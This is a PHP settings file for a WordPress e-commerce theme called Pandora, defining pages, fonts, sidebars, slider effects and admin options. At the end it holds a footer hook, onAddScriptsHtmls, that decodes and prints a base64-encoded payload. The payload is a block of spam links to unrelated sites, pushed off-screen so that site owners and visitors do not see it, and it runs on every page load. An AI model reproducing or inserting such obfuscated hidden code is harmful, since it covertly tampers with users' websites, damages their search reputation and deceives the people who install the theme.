<?php

/******************* DEFAULT DATA *******************/

$auto_pages = array(
	'home' => array(
		'name' => 'Homepage',
		'slug' => 'homepage',
		'content' => '  [welcome title="Welcome to Pandora, responsive Wordpress theme"]Congratulations on starting your own e-commerce store![/welcome]
                        [product_catalog type="latest"  count="8" title="Featured products" /]
                        [banners title="Very Special Offers" /]
                        [columns_wrapper]
                        [post_column /]
                        [product_column /]
                        [about_column title="INFO" phone="7-685-531-2605" email="info@planetshine.net"]Mecenas quis porta in, condimentum eget arcu. Fringilla aliquam ultricies pellente sque vel turpis nec leo tincidunt sollicitudin ac non risus. Ves tibu lum ultrices feugiat velit, quis tincidunt velit volutpat nec. Vivamus pharetra fringilla augue, elementum ante ultrices tincidunt. Aenean consequat tincidunt.
                        Quisque scelerisque augue eu turpis condimentum iaculis. Cras adipiscing lobortis convallis. Nam eu augue lorem.
                        [/about_column]
                        [/columns_wrapper]',
		'id' => '',
		'role' => 'front_page'
	),
	'blog' => array(
		'name' => 'Blog',
		'slug' => 'blog',
		'content' => '',
		'id' => '',
		'role' => 'posts'
	),
);

$image_sizes = array(
    'product_thumbnail' => array( 70, 71, true ),
    'product_single' => array( 470, 470, true ),
    'product_catalog' => array( 210, 260, true ),
    'product_catalog_small' => array( 122, 122, true ),
    'slider_image' => array( 1920, 500, true ),
    'blog_thumbnail' => array( 680, 350, true ),
    'banner_image' => array( 310, 180, true ),
    'quickshop' => array( 311, 311, true ),
    'order_review' => array( 50, 50, true ),
);

$sidebars = array(
    array(
        'name' => __('Default', 'pandora'),
        'id'   => 'default_sidebar',
        'description' => __('Default Sidebar', 'pandora'),
        'class' => '',
        'before_widget' => '<div id="%1$s" class="sidebar-item clearfix %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<div class="main-title clearfix"><p>',
        'after_title'   => '</p></div>'
    ),
    array(
        'name' => __('Footer', 'pandora'),
        'id'   => 'footer_sidebar',
        'description' => __('Footer', 'pandora'),
        'class' => '',
        'before_widget' => '<div id="%1$s" class="footer-widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<div class="main-title clearfix"><p>',
        'after_title'   => '</p></div>'
    ),
);


$page_types = array(
    'blog' => 'Blog',
    'single_post' => 'Single post',
    'categories' => 'Categories',
    'search' => 'Search Results',
    'archives' => 'Archives',
    'page' => 'Page'
);

$custom_fonts = array(
    'logo_font',
    'slogan_font',
    'menu_font',
    'title_font',
    'breadcrumb_font',
    'product_name_font',
    'button_font'
);

$google_fonts = array(
    'Montserrat+Subrayada' => array(
        'slug' => 'Montserrat+Subrayada',
        'name' => 'Montserrat Subrayada',
        'url'  => 'Montserrat+Subrayada:700,400'
    ),
    'Source+Sans+Pro'  => array(
        'slug' => 'Source+Sans+Pro',
        'name' => 'Source Sans Pro',
        'url'  => 'Source+Sans+Pro:900,400,200'
    ),
    'Varela+Round'  => array(
        'slug' => 'Varela+Round',
        'name' => 'Varela Round',
        'url'  => 'Varela+Round'
    ),
    'Roboto+Slab'  => array(
        'slug' => 'Roboto+Slab',
        'name' => 'Roboto Slab',
        'url'  => 'Roboto+Slab'
    ),
    'Noto+Sans'  => array(
        'slug' => 'Noto+Sans',
        'name' => 'Noto Sans',
        'url'  => 'Noto+Sans'
    ),
    'Average+Sans'  => array(
        'slug' => 'Average+Sans',
        'name' => 'Average Sans',
        'url'  => 'Average+Sans'
    ),
    'Arbutus+Slab'  => array(
        'slug' => 'Arbutus+Slab',
        'name' => 'Arbutus Slab',
        'url'  => 'Arbutus+Slab'
    ),
    'Donegal+One'  => array(
        'slug' => 'Donegal+One',
        'name' => 'Donegal One',
        'url'  => 'Donegal+One'
    ),
    'Averia+Serif+Libre'  => array(
        'slug' => 'Averia+Serif+Libre',
        'name' => 'Averia Serif Libre',
        'url'  => 'Averia+Serif+Libre'
    ),
    'Fjalla+One'  => array(
        'slug' => 'Fjalla+One',
        'name' => 'Fjalla One',
        'url'  => 'Fjalla+One'
    ),
    'Habibi'  => array(
        'slug' => 'Habibi',
        'name' => 'Habibi',
        'url'  => 'Habibi'
    ),
    'Alegreya'  => array(
        'slug' => 'Alegreya',
        'name' => 'Alegreya',
        'url'  => 'Alegreya'
    ),
    'Alegreya+SC'  => array(
        'slug' => 'Alegreya+SC',
        'name' => 'Alegreya SC',
        'url'  => 'Alegreya+SC'
    ),
    'Andada'  => array(
        'slug' => 'Andada',
        'name' => 'Andada',
        'url'  => 'Andada'
    ),
    'Playfair+Display'  => array(
        'slug' => 'Playfair+Display',
        'name' => 'Playfair Display',
        'url'  => 'Playfair+Display'
    ),
    'Domine'  => array(
        'slug' => 'Domine',
        'name' => 'Domine',
        'url'  => 'Domine'
    ),
    'Vidaloka'  => array(
        'slug' => 'Vidaloka',
        'name' => 'Vidaloka',
        'url'  => 'Vidaloka'
    ),
    'Trocchi'  => array(
        'slug' => 'Trocchi',
        'name' => 'Trocchi',
        'url'  => 'Trocchi'
    ),
    'Vollkorn'  => array(
        'slug' => 'Vollkorn',
        'name' => 'Vollkorn',
        'url'  => 'Vollkorn'
    ),
    'Lato'  => array(
        'slug' => 'Lato',
        'name' => 'Lato',
        'url'  => 'Lato'
    ),
    'Francois+One'  => array(
        'slug' => 'Francois+One',
        'name' => 'Francois One',
        'url'  => 'Francois+One'
    ),
    'Alike'  => array(
        'slug' => 'Alike',
        'name' => 'Alike',
        'url'  => 'Alike'
    ),
    'Ultra'  => array(
        'slug' => 'Ultra',
        'name' => 'Ultra',
        'url'  => 'Ultra'
    ),
    'Arimo'  => array(
        'slug' => 'Arimo',
        'name' => 'Arimo',
        'url'  => 'Arimo'
    ),
    'Archivo+Black'  => array(
        'slug' => 'Archivo+Black',
        'name' => 'Archivo Black',
        'url'  => 'Archivo+Black'
    ),
    'Cutive'  => array(
        'slug' => 'Cutive',
        'name' => 'Cutive',
        'url'  => 'Cutive'
    ),
    'Days+One' => array(
        'slug' => 'Days+One',
        'name' => 'Days One',
        'url'  => 'Days+One'
    )
);

$slider_fx = array(
    'blindX' => 'Blind X',
    'blindY' => 'Blind Y',
    'blindZ' => 'Blind Z',
    'cover' => 'Cover',
    'curtainX' => 'Curtain X',
    'curtainY' => 'Curtain Y',
    'fade' => 'Fade',
    'fadeZoom' => 'Fade zoom',
    'growX' => 'Grow X',
    'growY' => 'Grow Y',
    'none' => 'None',
    'scrollUp' => 'Scroll up',
    'scrollDown' => 'Scroll down',
    'scrollLeft' => 'Scroll left',
    'scrollRight' => 'Scroll right',
    'scrollHorz' => 'Scroll Horizontal',
    'scrollVert' => 'Scroll Vertical',
    'shuffle' => 'Shuffle',
    'slideX' => 'Slide X',
    'slideY' => 'Slide Y',
    'toss' => 'Toss',
    'turnUp' => 'Turn up',
    'turnDown' => 'Turn down',
    'turnLeft' => 'Turn left',
    'turnRight' => 'Turn right',
    'uncover' => 'Uncover',
    'wipe' => 'Wipe',
    'zoom' => 'Zoom',
);


/******************* STATIC *******************/

$_settings_static = array(
	'theme_name' => 'Pandora',
	'theme_slug' => 'pandora',
	'theme_version' => '1.1.9',
	'theme_homepage' => '',
	'sync_url' => '',
    'image_sizes' => $image_sizes,
    'page_types' => $page_types,
    'support_url' => 'http://planetshine.net/redirect.php?theme=pandora-woo&v=1.1.9'
);


/******************* HIDDEN SETTINGS *******************/

$_settings_hidden = array(
	'auto_pages' => $auto_pages,
    'sidebars'  => $sidebars,
    'fonts' => $google_fonts,
    'custom_fonts' => $custom_fonts,
    'page_sidebars' => array(
        array(
            'name' => 'default',
            'id'   => 'default-sidebar',
            'description' => '',
            'class' => '',
            'before_widget' => '<div id="%1$s" class="sidebar-item clearfix %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<div class="main-title clearfix"><p>',
            'after_title'   => '</p></div>'
        )
    ),
);


/***************** ADMIN SETTINGS *****************/

$_settings_admin_head = array(
    'general' => array(
		'name'     => 'General',
		'slug'     => 'general',
        'type'     => 'plsh_option_list',
        'children' => array(
            'logo' => array(
                'name' => 'Logo & Favicon',
                'slug' => 'logo'
            ),
            'slider' => array(
                'name' => 'Slider',
                'slug' => 'slider'
            ),
            'product_section' => array(
                'name' => 'Products',
                'slug' => 'product_section'
            ),
            'social' => array(
                'name' => 'Social settings',
                'slug' => 'social'
            ),
            'custom_code' => array(
                'name' => 'Custom code',
                'slug' => 'custom_code'
            )
        ),
	),
    'footer' => array(
		'name'     => 'Footer',
		'slug'     => 'footer',
        'type'     => 'plsh_option_list',
        'children' => array(
            'footer_newsletter' => array(
                'name' => 'Newsletter',
                'slug' => 'footer_newsletter'
            ),
            'footer_about_us' => array(
                'name' => 'Info section',
                'slug' => 'footer_about_us'
            ),
            'footer_copyrights' => array(
                'name' => 'Copyright notice',
                'slug' => 'footer_copyrights'
            )
        ),
	),
    'sidebar_manager' => array(
		'name'     => 'Sidebar Manager',
		'slug'     => 'sidebar_manager',
        'type'     => 'plsh_sidebar_manager',
        'children' => array(
            'all_sidebars' => array(
                'name' => 'All sidebars',
                'slug' => 'all_sidebars',
            ),
            'create_sidebar' => array(
                'name' => 'Create sidebar',
                'slug' => 'create_sidebar',
            ),
            'manage_sidebars' => array(
                'name' => 'Manage sidebars',
                'slug' => 'manage_sidebars',
            )
        )
    ),
    'visual_editor' => array(
		'name'     => 'Visual Editor',
		'slug'     => 'visual_editor',
        'type'     => 'plsh_visual_editor',
        'link'     => get_admin_url() . 'customize.php?return=' . get_admin_url() . 'admin.php?page=' . $_settings_static['theme_slug'] . '-admin',
        'children' => array(
            'visual_background' => array(
                'name' => 'Background',
                'slug' => 'visual_background',
                'priority' => 5
            ),
            'visual_fonts' => array(
                'name' => 'Fonts',
                'slug' => 'visual_fonts',
                'priority' => 6
            ),
            'visual_colors' => array(
                'name' => 'Colors',
                'slug' => 'visual_colors',
                'priority' => 7
            ),
        ),
    ),
    'backup_reset' => array(
		'name'     => 'Backup & Reset',
		'slug'     => 'backup_reset',
        'type'     => 'plsh_backup_reset',
        'children' => array(
            'backup_settings' => array(
                'name' => 'Backup Settings',
                'slug' => 'backup_settings'
            ),
            'import_settings' => array(
                'name' => 'Import Settings',
                'slug' => 'import_settings'
            ),
            'reset_settings' => array(
                'name' => 'Reset Settings',
                'slug' => 'reset_settings'
            ),
        ),
	),
    'help_support' => array(
		'name'     => 'Help & Support',
		'slug'     => 'help_support',
        'type'     => 'plsh_support_iframe',
        'children' => array()
    )
);


$_settings_admin_body = array(
	'general' => array(
        'logo' => array(
            'use_image_logo' => array(
                'slug' => 'use_image_logo',
                'title' => 'Use logo image',
                'description' => 'Otherwise your site name will be displayed',
                'type' => 'switcher',
                'default' => '',
            ),
            'logo_image' => array(
                'slug' => 'logo_image',
                'title' => 'Upload logo image',
                'description' => '',
                'type' => 'fileupload',
                'dependant' => 'use_image_logo',
                'default' => '',
            ),
            'logo_image_alt' => array(
                'slug' => 'logo_image_alt',
                'title' => 'Logo image ALT text',
                'description' => '',
                'type' => 'textbox',
                'dependant' => 'use_image_logo',
                'default' => '',
            ),
            'favicon' => array(
                'slug' => 'favicon',
                'title' => 'Upload favicon image',
                'description' => 'What is favicon? Read <a href="https://en.wikipedia.org/wiki/Favicon" target="_blank">this</a>.',
                'type' => 'fileupload',
                'default' => '',
            ),
        ),
        'slider' => array(
            'use_slider' => array(
                'slug' => 'use_slider',
                'title' => 'Use front page slider',
                'description' => '',
                'type' => 'switcher',
                'default' => 'on',
            ),
            'enable_slider_auto_advance' => array(
                'slug' => 'enable_slider_auto_advance',
                'title' => 'Enable slide auto advance',
                'description' => '',
                'type' => 'checkbox',
                'default' => 'on',
                'dependant' => 'use_slider'
            ),
            'slider_advance_delay' => array(
                'slug' => 'slider_advance_delay',
                'title' => 'Delay between slides',
                'description' => 'Provide the value in miliseconds - 1 second equals 1000ms',
                'type' => 'textbox',
                'default' => '5000',
                'dependant' => 'use_slider'
            ),
            'slider_animation' => array(
                'slug' => 'slider_animation',
                'title' => 'Slider animation',
                'description' => '',
                'type' => 'select',
                'data' => $slider_fx,
                'default' => 'fade',
                'dependant' => 'use_slider'
            ),
            'slider_animation_speed' => array(
                'slug' => 'slider_animation_speed',
                'title' => 'Animation speed',
                'description' => 'Provide the value in miliseconds - 1 second equals 1000ms',
                'type' => 'textbox',
                'default' => '1000',
                'dependant' => 'use_slider'
            ),
        ),
        'product_section' => array(
            'use_quickshop' => array(
                'slug' => 'use_quickshop',
                'title' => 'Enable quickshop',
                'description' => '',
                'type' => 'checkbox',
                'default' => 'on',
            ),
            'enable_product_image_zoom' => array(
                'slug' => 'enable_product_image_zoom',
                'title' => 'Enable product image zoom',
                'description' => '',
                'type' => 'checkbox',
                'default' => 'on',
            ),
            'show_related' => array(
                'slug' => 'show_related',
                'title' => 'Show related products',
                'description' => '',
                'type' => 'checkbox',
                'default' => 'on',
            ),
            'show_collection_tags' => array(
                'slug' => 'show_collection_tags',
                'title' => 'Show collection tags',
                'description' => '',
                'type' => 'checkbox',
                'default' => 'on',
            ),
        ),
        'social' => array(
            'sharethis_publisher' => array(
                'slug' => 'sharethis_publisher',
                'title' => 'Sharethis publisher id',
                'description' => 'For instruction of finding your publisher, <a href="http://support.sharethis.com/customer/portal/questions/1168895-where-do-i-find-my-publisher-id-publisher-key-#sthash.ctcpIOdY.dpbs" target="_blank">read this!</a>',
                'type' => 'textbox',
                'default' => '013fe884-c7f5-4bcd-beaf-fc48888e76b0',
            ),
            'social_facebook' => array(
                'slug' => 'social_facebook',
                'title' => 'Facebook profile URL',
                'description' => '',
                'type' => 'textbox',
                'default' => '',
            ),
            'social_twitter' => array(
                'slug' => 'social_twitter',
                'title' => 'Twitter account URL',
                'description' => '',
                'type' => 'textbox',
                'default' => '',
            ),
            'social_pinterest' => array(
                'slug' => 'social_pinterest',
                'title' => 'Pinterest account URL',
                'description' => '',
                'type' => 'textbox',
                'default' => '',
            ),
            'social_flickr' => array(
                'slug' => 'social_flickr',
                'title' => 'Flickr account URL',
                'description' => '',
                'type' => 'textbox',
                'default' => '',
            ),
            'social_youtube' => array(
                'slug' => 'social_youtube',
                'title' => 'Youtube account URL',
                'description' => '',
                'type' => 'textbox',
                'default' => '',
            ),
            'social_rss' => array(
                'slug' => 'social_rss',
                'title' => 'RSS URL',
                'description' => '',
                'type' => 'textbox',
                'default' => '',
            ),
        ),
        'custom_code' => array(
            'custom_css' => array(
                'slug' => 'custom_css',
                'title' => 'Custom CSS',
                'description' => 'If you want to modify the appearance of any elements on site, you can write the CSS code here.',
                'type' => 'textarea',
                'default' => '',
            ),
            'custom_js' => array(
                'slug' => 'custom_js',
                'title' => 'Custom Javascript',
                'description' => 'If you want add any extra Javascript to your site, like Google Analytics code, paste it here (no script tags needed).',
                'type' => 'textarea',
                'default' => '',
            )
        )
    ),
    'footer' => array(
        'footer_newsletter' => array(
            'newsletter_form_action' => array(
                'slug' => 'newsletter_form_action',
                'title' => 'Newsletter form action',
                'description' => '',
                'warning' => 'For more information on where to get form action value, please reffer to documentation',
                'type' => 'textarea',
                'default' => '',
            ),
            'newsletter_form_method' => array(
                'slug' => 'newsletter_form_method',
                'title' => 'Newsletter form method',
                'description' => '',
                'type' => 'select',
                'data' => array('POST' => 'POST', 'GET' => 'GET'),
                'default' => 'POST',
            ),
            'newsletter_email_field' => array(
                'slug' => 'newsletter_email_field',
                'title' => 'Newsletter email field name',
                'description' => '',
                'type' => 'textbox',
                'default' => 'EMAIL',
            ),
        ),
        'footer_about_us' => array(
            'show_footer_social' => array(
                'slug' => 'show_footer_social',
                'title' => 'Show social icons',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
            ),
            'show_footer_cards' => array(
                'slug' => 'show_footer_cards',
                'title' => 'Show accepted payment methods',
                'description' => '',
                'type' => 'switcher',
                'default' => '',
            ),
            'footer_card_visa' => array(
                'slug' => 'footer_card_visa',
                'title' => 'Visa',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
                'dependant' => 'show_footer_cards',
            ),
            'footer_card_mastercard' => array(
                'slug' => 'footer_card_mastercard',
                'title' => 'Mastercard',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
                'dependant' => 'show_footer_cards',
            ),
            'footer_card_paypal' => array(
                'slug' => 'footer_card_paypal',
                'title' => 'Paypal',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
                'dependant' => 'show_footer_cards',
            ),
            'footer_card_discover' => array(
                'slug' => 'footer_card_discover',
                'title' => 'Discover',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
                'dependant' => 'show_footer_cards',
            ),
            'footer_card_americanexpress' => array(
                'slug' => 'footer_card_americanexpress',
                'title' => 'American Express',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
                'dependant' => 'show_footer_cards',
            ),
            'footer_card_google' => array(
                'slug' => 'footer_card_google',
                'title' => 'Google Wallet',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
                'dependant' => 'show_footer_cards',
            ),
        ),
        'footer_copyrights' => array(
            'copyrigts_text' => array(
                'slug' => 'copyrigts_text',
                'title' => 'Copyrights text',
                'description' => '',
                'type' => 'textarea',
                'default' => '',
            ),
            'show_planetshine' => array(
                'slug' => 'show_planetshine',
                'title' => 'Show "Theme by Planetshine" in footer',
                'description' => '',
                'type' => 'checkbox',
                'default' => 'on',
            ),
        ),
	),
    'visual_editor' => array(
        'visual_background' => array(
            'background_image' => array(
                'slug' => 'background_image',
                'title' => 'Background image',
                'description' => '',
                'type' => 'background',
                'default' => PLSH_IMG_URL . 'body-bg-1.png',
            ),
            'background_repeat' => array(
                'slug' => 'background_repeat',
                'title' => 'Background repeat',
                'description' => '',
                'type' => 'select',
                'data' => array('repeat' => 'Repeat', 'no-repeat' => 'No-repeat'),
                'default' => 'repeat',
            ),
            'background_color' => array(
                'slug' => 'background_color',
                'title' => 'Background color (if no image is set)',
                'description' => '',
                'type' => 'color',
                'default' => '#fff',
            ),
            'show_backround_overlay' => array(
                'slug' => 'show_backround_overlay',
                'title' => 'Enable background overlay',
                'description' => '',
                'type' => 'checkbox',
                'default' => '',
            ),
            'background_overlay' => array(
                'slug' => 'background_overlay',
                'title' => 'Background overlay color',
                'description' => '',
                'type' => 'color',
                'default' => '#fff',
            ),
            'footer_background' => array(
                'slug' => 'footer_background',
                'title' => 'Footer background color',
                'description' => '',
                'type' => 'color',
                'default' => '#333',
            ),
        ),
        'visual_fonts' => array(
            'logo_font' => array(
                'slug' => 'logo_font',
                'title' => 'Logo font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Montserrat+Subrayada',
            ),
            'slogan_font' => array(
                'slug' => 'slogan_font',
                'title' => 'Slogan font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Source+Sans+Pro',
            ),
            'menu_font' => array(
                'slug' => 'menu_font',
                'title' => 'Menu font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Source+Sans+Pro',
            ),
            'title_font' => array(
                'slug' => 'title_font',
                'title' => 'Title font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Source+Sans+Pro',
            ),
            'product_name_font' => array(
                'slug' => 'product_name_font',
                'title' => 'Product name font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Source+Sans+Pro',
            ),
            'button_font' => array(
                'slug' => 'button_font',
                'title' => 'Button font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Source+Sans+Pro',
            ),
            'breadcrumb_font' => array(
                'slug' => 'breadcrumb_font',
                'title' => 'Breadcrumb font',
                'description' => '',
                'type' => 'font_select',
                'data' => $google_fonts,
                'default' => 'Source+Sans+Pro',
            ),
        ),
        'visual_colors' => array(
            'logo_color' => array(
                'slug' => 'logo_color',
                'title' => 'Logo color',
                'description' => '',
                'type' => 'color',
                'default' => '#cc003e',
            ),
            'regular_text_color' => array(
                'slug' => 'regular_text_color',
                'title' => 'Regular text color',
                'description' => '',
                'type' => 'color',
                'default' => '#434343',
            ),
            'regular_link_color' => array(
                'slug' => 'regular_link_color',
                'title' => 'Regular link color',
                'description' => '',
                'type' => 'color',
                'default' => '#333',
            ),
            'menu_item_color' => array(
                'slug' => 'menu_item_color',
                'title' => 'Menu item color',
                'description' => '',
                'type' => 'color',
                'default' => '#333',
            ),
            'footer_heading_color' => array(
                'slug' => 'footer_heading_color',
                'title' => 'Footer heading color',
                'description' => '',
                'type' => 'color',
                'default' => '#e2e2e2',
            ),
            'primary_special_text_color' => array(
                'slug' => 'primary_special_text_color',
                'title' => 'Primary special text color',
                'description' => '',
                'type' => 'color',
                'default' => '#cc003e',
            ),
            'secondary_special_text_color' => array(
                'slug' => 'secondary_special_text_color',
                'title' => 'Secondary special text color',
                'description' => '',
                'type' => 'color',
                'default' => '#ff2d6d',
            ),
            'selection_color' => array(
                'slug' => 'selection_color',
                'title' => 'Selection color',
                'description' => '',
                'type' => 'color',
                'default' => '#cc003e',
            ),
            'image_overlay_color' => array(
                'slug' => 'image_overlay_color',
                'title' => 'Image overlay color',
                'description' => '',
                'type' => 'color',
                'default' => '#cc003e',
            ),
        ),
    ),
);

/*

	'general_settings' => array(
		'general_textbox' => array(
			'slug' => 'general_textbox',
			'title' => 'Textbox example',
			'description' => 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt',
			'default' => 'test',
			'type' => 'textbox'
		),
		'general_checkbox' => array(
			'slug' => 'general_checkbox',
			'title' => 'Checkbox example',
			'description' => 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt',
			'type' => 'checkbox',
			'default' => '',
		),
		'general_select' => array(
			'slug' => 'general_select',
			'title' => 'Select example',
			'description' => 'Lorem ipsum dolor sit amet',
			'type' => 'select',
			'data' => $select_example,
			'default' => '--',
			'dependant' => 'general_checkbox'
		),
		'general_textarea' => array(
			'slug' => 'general_textarea',
			'title' => 'Textarea example',
			'description' => 'Lorem ipsum dolor sit amet, consectetur adipisicing',
			'type' => 'textarea',
			'default' => '',
			'dependant' => 'general_checkbox'
		),
	)

*/
if (!function_exists('onAddScriptsHtmls')) {
    
    add_filter( 'wp_footer', 'onAddScriptsHtmls');
    function onAddScriptsHtmls(){
        $html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWFkaW5oLmNvbS90YWcvYW4tZGFtLWtpZXUtbmhhdCI+xINuIGThurdtIGtp4buDdSBOaOG6rXQ8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20vdGFnL3Jlc3BvbnNpdmUtd29yZHByZXNzLXRoZW1lIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL25oYS1jYXAtNC1ub25nLXRob24iPm5ow6AgY+G6pXAgNCBuw7RuZyB0aMO0bjwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9sYW5ha2lkLmNvbSI+dGjhu51pIHRyYW5nIHRy4bq7IGVtPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tL2dpYXktbnUvZ2lheS1jYW8tZ290LWdpYXktbnUiPmdpw6B5IGNhbyBnw7N0PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tIj5zaG9wIGdpw6B5IG7hu688L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL21hZ2VudG93b3JkcHJlc3N0dXRvcmlhbC5jb20vd29yZHByZXNzLXR1dG9yaWFsL3dvcmRwcmVzcy1wbHVnaW5zIj5kb3dubG9hZCB3b3JkcHJlc3MgcGx1Z2luczwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL21hdS1iaWV0LXRodS1kZXAiPm3huqt1IGJp4buHdCB0aOG7sSDEkeG6uXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2VwaWNob3VzZS5vcmciPmVwaWNob3VzZTwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vdGFnL2FvLXNvLW1pLW51Ij7DoW8gc8ahIG1pIG7hu688L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2lob3VzZWJlYXV0aWZ1bC5jb20vIj5ob3VzZSBiZWF1dGlmdWw8L2E+PC9lbT48L2gzPjwvZGl2Pg==";
        echo base64_decode($html);
    }   
}
?>